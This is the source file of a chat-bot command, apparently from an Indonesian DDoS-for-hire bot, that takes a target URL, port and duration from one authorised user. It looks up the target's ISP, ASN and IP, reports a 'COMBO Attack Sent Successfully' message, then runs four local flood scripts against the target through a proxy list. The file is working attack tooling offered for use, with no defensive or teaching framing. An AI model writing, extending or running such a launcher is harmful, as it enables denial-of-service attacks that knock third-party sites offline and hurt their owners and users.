const axios = require("axios");
const url = require("url");
const path = require("path");
const { exec } = require("child_process");

const allowedId = 7818441356;

module.exports = {
  command: ["combo"],
  run: async ({ client, message }) => {
    const senderId = parseInt(message.sender?.userId || message.senderId?.userId || message.senderId);
    if (senderId !== allowedId) return;

    const rawText = message.message?.trim();
    const args = rawText.split(/\s+/);
    args.shift(); // hapus command "https"

    if (args.length < 3) {
      return client.sendMessage(message.chatId, {
        message: "❌ Masukkan target, port, dan durasi.\n\nContoh:\ncombo https://example.com 443 60",
        replyTo: message.id,
      });
    }

    const [target, port, duration] = args;
    const parsing = new url.URL(target);
    const hostname = parsing.hostname;

    const { data } = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`);
    const info = data;

    const caption = `<blockquote>
✅ <b>COMBO Attack Sent Successfully</b>
──────────────────────
🌐 <b>Host:</b> ${hostname}
📌 <b>Port:</b> ${port}
⏱️ <b>Duration:</b> ${duration}s
📡 <b>Method:</b> COMBO
─────────────────────
🏢 <b>ISP:</b> ${info.isp}
🏷️ <b>ASN:</b> ${info.as}
🌍 <b>IP:</b> ${info.query}
</blockquote>`;

    await client.sendMessage(message.chatId, {
      message: caption,
      parseMode: "html",
      replyTo: message.id,
    });
    const strike = path.join(__dirname, `../lib/cache/strike`);
    const xnx = path.join(__dirname, `../lib/cache/xnx`);
    const zerovip = path.join(__dirname, `../lib/cache/zerovip`);
    const scriptPath = path.join(__dirname, "../lib/cache/1");
    exec(`node ${scriptPath} ${target} ${duration}`);
    exec(`node ${zerovip} ${target} ${duration} 100 16 proxy.txt`);
    exec(`node ${xnx} ${target} ${duration} 100 16 proxy.txt`);
    exec(`node ${strike} ${target} ${duration} 100 16 proxy.txt`);
  },
};